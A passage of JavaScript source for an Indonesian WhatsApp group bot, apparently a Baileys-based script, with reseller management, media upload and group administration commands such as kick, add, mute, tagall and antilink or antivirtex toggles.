ryozingod.sendMessage(prem1 + '@s.whatsapp.net', {
image: { url: 'https://telegra.ph/file/4591e4839848523095e05.jpg' },
caption: 'Kamu sekarang adalah Reseller!!'
}, { quoted: m })
break
//=================================================//
case 'delseller':
if (!isDeveloper) return 
if (!args[0]) return joreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = orgkaya.indexOf(prem2)
orgkaya.splice(unp, 1)
fs.writeFileSync('./dtbs/seller.json', JSON.stringify(orgkaya))
joreply(`${prem2} Tidak lagi Reseller!!!`)
break

//Scrapper

//=================================================//
case 'tourl': {
joreply(mess.wait)
let media = await ryozingod.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await uptotelegra(media)
joreply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
joreply(util.format(anu))
}
}
break

//Group Menu
case "resetlinkgc": case "revoke":{
if (!isPremium) return joreply(mess.premium)
if (!isGroup) return joreply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return joreply('Khusus Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
await ryozingod.groupRevokeInvite(m.chat).then((res) => joreply(`Sukses riset link group`)).catch((err) => joreply(jsonformat(err)))
}
break
//=================================================//
case 'jid': {
if(!isGroup) return joreply("Hanya bisa di dalam group")
let _meta = await ryozingod.groupMetadata(m.chat)
console.log(_meta)
let _img = await ryozingod.profilePictureUrl(_meta.id, 'image') 
let caption = `${_meta.subject} - Created on ${moment(_meta.creation * 1000).format('ll')}\n\n` +
`*${_meta.participants.length}* Total Members\n*${_meta.participants.filter(x => x.admin === 'admin').length}* Admin\n*${_meta.participants.filter(x => x.admin === null).length}* Not Admin\n\n` +
`Group ID : ${_meta.id}`
dest = global.owner + "@s.whatsapp.net"
await ryozingod.sendMessage(dest,{
caption,
image: await getBuffer(_img)
},
{ quoted: m }
)
}
break
//=================================================//
case  'getppgc':
if (!isGroup) return 
joreply(mess.wait)
try {
var ppimg = await ryozingod.profilePictureUrl(m.chat, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await ryozingod.sendMessage(m.chat, { image: { url: ppimg }}, { quoted: m })
break
//=================================================//
case 'mute': {
if (!isGroup) return joreply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return joreply('Khusus Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
if (!args[0]) return joreply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
joreply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
ryozingod.groupSettingUpdate(m.chat, 'announcement')
joreply(`Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup🙏\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin`)
}, timer)
}
break
//=================================================//
case 'unmute': {
if (!isGroup) return joreply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return joreply('Khusus Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
if (!args[0]) return joreply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
joreply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
ryozingod.groupSettingUpdate(m.chat, 'not_announcement')
joreply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break
//=================================================//

//=================================================//
case 'hidetag':
if (!isGroup) return joreply(mess.only.group)
if (!isAdmins && !isDeveloper) return joreply('Khusus Admin')
if (!q) return joreply(`Teks Nya Mana Kak?`)
ryozingod.sendMessage(m.chat, {
    text: q,
    contextInfo: {
        mentionedJid: participants.map(a => a.id),
        groupMentions: [{
            groupJid: m.chat,
            groupSubject: 'anjay'
        }]
    }
})
break
//=================================================//
case 'tagsubject':
if (!isGroup) return joreply(mess.only.group)
if (!isAdmins && !isDeveloper) return joreply('Khusus Admin')
if (!q) return joreply(`Teks Nya Mana Kak?`)
ryozingod.sendMessage(m.chat, {
    text: "@"+m.chat,
    contextInfo: {
        mentionedJid: participants.map(a => a.id),
        groupMentions: [{
            groupJid: m.chat,
            groupSubject: q
        }]
    }
})
break
//=================================================//
case "tagall": {
if (!isDeveloper && !isAdmins) return joreply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return joreply(`Teks Nya Mana Kak?`)
let teks = `*Spider V600* \n\n${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
ryozingod.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
//=================================================//
case 'linkgroup': case 'invite':{
if (!isDeveloper && !isAdmins) return joreply(mess.admin)
if (!m.isGroup) return joreply(mess.only.group)
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
let response = await ryozingod.groupInviteCode(m.chat)
ryozingod.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'editdesk':{
if (!isGroup) return joreply(`Khusus Group Bego`)
if (!isPremium) return joreply(mess.premium)
if (!isGroup) return joreply(`Khusus Group Bego`)
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
if (!text) return joreply(`teks untuk subject nya mana bego`)
await ryozingod.groupUpdateDescription(m.chat, text)
joreply('Gacor Kang,Sukses,🔥')
}
break
//=================================================//
case 'editsubjek': {
if (!isPremium) return joreply(mess.premium)
if (!isGroup) return joreply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return joreply('Khusus Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
if (!text) return joreply(`teks untuk subject nya mana bego`)
await ryozingod.groupUpdateSubject(m.chat, text)
joreply('Gacor Kang,Sukses,🔥')
}
break
//=================================================//
case 'editinfo': {
if (!isPremium) return joreply(mess.premium)
if (!isGroup) return joreply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return joreply('Khusus Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
 if (args[0] === 'open'){
await ryozingod.groupSettingUpdate(m.chat, 'unlocked').then((res) => joreply(`Sukses Membuka Edit Info Group`)).catch((err) => joreply(jsonformat(err)))
 } else if (args[0] === 'close'){
await ryozingod.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => joreply(jsonformat(err)))
 } else {
 joreply(` Silahkan Ketik\nEditinfo Open\nEditinfo Close`)
}
}
break
//=================================================//
case 'editgroup': {
//inireact()   
if (!isPremium) return joreply(mess.premium)
if (!isGroup) return joreply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return joreply('Khusus Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
if (args[0] === 'close'){
await ryozingod.groupSettingUpdate(m.chat, 'announcement').then((res) => joreply(`Sukses Menutup Group`)).catch((err) => joreply(jsonformat(err)))
} else if (args[0] === 'open'){
await ryozingod.groupSettingUpdate(m.chat, 'not_announcement').then((res) => joreply(`Sukses Membuka Group`)).catch((err) => joreply(jsonformat(err)))
} else {
 joreply(`Silahkan Ketik\nGroup Open\nGroup Close`)
 }
}
break
//=================================================//
case "kick": {
if (!isGroup) return joreply('Only Group')
if (!isAdmins && !isDeveloper) return joreply('Only Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ryozingod.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => joreply(util.format(res))).catch((err) => joreply(util.format(err)))
}
break
//=================================================//
case "add": {
if (!isGroup) return joreply('Only Group')
if (!isAdmins && !isDeveloper) return joreply('Only Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ryozingod.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => joreply(util.format(res))).catch((err) => joreply(util.format(err)))
}
break
//=================================================//
case "demote": {
if (!isPremium) return joreply(mess.premium)
if (!isGroup) return joreply('Only Group')
if (!isAdmins && !isDeveloper) return joreply('Only Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admi:(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ryozingod.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => joreply(util.format(res))).catch((err) => joreply(util.format(err)))
}
break
//=================================================//
case 'setppgroup': {
if (!isDeveloper) return joreply(mess.usingsetpp)
if (!isGroup) return joreply('Only Group')
if (!isAdmins && !isDeveloper) return joreply('Only Admin')
if (!isBotAdmins) return joreply('Maaf Kak Kaya Nya Kakak Tidak Bisa Menggunakan Fitur Ini Di Karenakan Bot Bukan Admin Group')
if (!quoted) return joreply(`*Where is the picture?*`)
if (!/image/.test(mime)) return joreply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return joreply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await ryozingod.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await ryozingod.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
joreply(`*Success Beb✅*`)
} else {
var memeg = await ryozingod.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
joreply(`*Success Beb✅*`)
}
}
break
//=================================================//
case 'antilink': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(m.chat)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(m.chat)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
//=================================================//
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiVirtex) return m.reply('_Sudah Diaktifkan_')
ntvirtex.push(m.chat)
fs.writeFileSync('./dtbs/enable/antivirus.json', JSON.stringify(ntvirtex))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await ryozingod.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ryozingod.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada orang yang diperbolehkan mengirim virus di grup ini, anggota yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiVirtex) return m.reply('_Sudah Dimatikan_')
let off = ntvirtex.indexOf(m.chat)
ntvirtex.splice(off, 1)
fs.writeFileSync('./dtbs/enable/antivirus.json', JSON.stringify(ntvirtex))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return m.reply('_Sudah Diaktifkan_')
ntilinkytvid.push(m.chat)
fs.writeFileSync('./dtbs/enable/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await ryozingod.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ryozingod.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link video youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return m.reply('_Sudah Dimatikan_')
let off = ntilinkytvid.indexOf(m.chat)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./dtbs/enable/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
